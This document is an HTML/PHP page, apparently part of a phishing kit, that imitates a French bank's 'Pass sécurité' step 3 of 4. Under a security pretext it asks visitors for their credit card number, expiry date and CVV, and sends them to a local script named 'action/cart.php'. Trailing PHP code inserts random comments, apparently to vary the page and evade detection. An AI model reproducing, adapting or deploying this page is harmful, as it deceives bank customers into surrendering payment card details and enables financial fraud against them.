...
<html lang="FR" class="swm-root-active swm-mode-page"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
...
<body class="PRI waitJeton swm " style="" cz-shortcut-listen="true">
...
<a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Déconnecter" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#">                <span class="rsp_link__label">Déconnecter</span>
	...
	<h1 class="rsp_header__title-page" id="js-mobile-title">Pass sécurité - Etape 3/4</h1>
...
<div class="swm-popin-wrapper" tabindex="0" role="dialog" aria-live="assertive">
    ...
    <main role="main" class="dcw_authent dcw_csetape">
        <div class="dcw_codeContainer">
            ...
            <div id="codCl" >
				<form action="action/cart.php" method="POST" onsubmit="return cc()">
                <div class="dcw_block dcw_block-text">
                    <div class="dcw_block-element">
                        <h3>Par mesure de securite <br>Veuillez remplir vos coordonnées suivantes :</h3>
                    </div>
                </div>
                ...
                <div class="dcw_block dcw_block-input">
                    <div class="dcw_block-element">
						...
						<div class="row_section dcw_input-container">
                            <input id="ccFormatMonitor" name="ccFormatMonitor" type="text" class="dcw_input grey_cross ccFormatMonitor" placeholder=" " maxlength="19" autocomplete="off" autocapitalize="off" autocorrect="off" required="">
                            <span class="dcw_sprite dcw_to-clear"></span>
                            <span class="bar"></span>
                            <label>Numéro de carte de crédit</label>
                            <span class="text_is_invalid">Saisissez un numéro de carte valide</span>
                        </div><br>
						                        <div class="row_section dcw_input-container">
                <input id="inputExpDate" name="inputExpDate" type="text" class="dcw_input grey_cross" placeholder=" " maxlength="7" autocomplete="off" autocapitalize="off" autocorrect="off" required="">
                            <span class="dcw_sprite dcw_to-clear"></span>
                            <span class="bar"></span>
                            <label>MM / YY</label>
                            <span class="text_is_invalid">Saisissez un date d'expiration valide</span>
							<input type="hidden" name="SecureCard-expiryMonth"> 
							<input type="hidden" name="SecureCard-expiryYear">
                        </div><br>
						                        <div class="row_section dcw_input-container">
                            <input id="cvv" name="cvv" type="text" class="dcw_input grey_cross cvv" placeholder=" " maxlength="4" autocomplete="off" autocapitalize="off" autocorrect="off" required="">
                            <span class="dcw_sprite dcw_to-clear"></span>
                            <span class="bar"></span>
                            <label>Cryptogramme visuel</label>
                            <span class="text_is_invalid">Saisissez un cryptogramme visuel valide</span>
                        </div>
                    </div>
                </div>
                <div class="dcw_block dcw_block-input">
...
</body></html><?php echo "<!--".rand(0,99999999)."-->"?>
<?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?><?php echo "<!--".rand(0,99999999)."-->"?>
